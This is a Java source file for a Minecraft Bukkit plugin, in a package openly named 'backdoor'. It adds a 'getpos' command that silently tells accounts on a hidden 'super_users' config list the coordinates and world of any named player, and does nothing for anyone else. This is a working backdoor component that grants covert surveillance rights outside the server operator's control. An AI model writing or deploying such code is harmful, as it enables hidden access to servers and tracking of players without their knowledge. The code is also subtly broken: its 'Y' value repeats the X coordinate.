package com.zszf.backdoor.command;

import com.zszf.backdoor.backdoor;
import com.zszf.backdoor.entities.superUsers;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.jetbrains.annotations.NotNull;

import javax.annotation.ParametersAreNonnullByDefault;

public class getpos implements CommandExecutor {
    @Override
    @ParametersAreNonnullByDefault
    public boolean onCommand(@NotNull CommandSender commandSender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        if (args.length == 0){
            return false;
        }
        Player player = Bukkit.getPlayer(args[0]);
        Player sender = Bukkit.getPlayer(commandSender.getName());
        JavaPlugin instance = backdoor.instance;
        FileConfiguration configuration = instance.getConfig();
        configuration.getObject("super_users", superUsers.class);
        String[] players = superUsers.getPlayers();
        for (String s : players) {
            if (Bukkit.getPlayer(s) == sender) {
                assert sender != null;
                assert player != null;
                sender.sendMessage(player.getName()+"的X坐标："+ player.getLocation().getX() +"Y坐标："+ player.getLocation().getX() +
                        "所在世界："+player.getWorld());
                return true;
            }
        }
        return true;
    }
}
